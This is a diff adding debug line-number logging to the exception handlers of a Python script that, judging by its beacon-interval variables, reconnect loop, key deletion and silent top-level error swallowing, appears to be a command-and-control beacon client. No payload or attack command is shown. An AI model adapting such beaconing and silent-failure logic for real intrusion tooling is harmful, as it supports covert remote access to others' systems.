@@ -390,6 +390,7 @@ def main ():
         except ConnectionRefusedError:
             if VERBOSE:
                 print_fail("Failed to connect")
+                print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
         except ConnectionResetError:
             if BEACON_INTERVAL_MEM is not None:
                 BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
@@ -397,11 +398,13 @@ def main ():
                 BEACON_INTERVAL_SETTING - BEACON_INTERVAL_HDD
             if VERBOSE:
                 print_fail("Remote end terminated the connection")
+                print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
         except ConnectionAbortedError:
             exit()
         except Exception as e:
             if VERBOSE:
                 print(e)
+                print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
         finally:
             delete_keys()
             if BEACON_INTERVAL_SETTING is None:
@@ -419,9 +422,12 @@ def main ():
                 if VERBOSE:
                     print_fail("Critical Failure, Exiting")
                     print(e)
+                    print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                 else:
                     pass
 try:
     main()
 except:
-    pass
+    if VERBOSE:
+        print(exc_info())
+        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
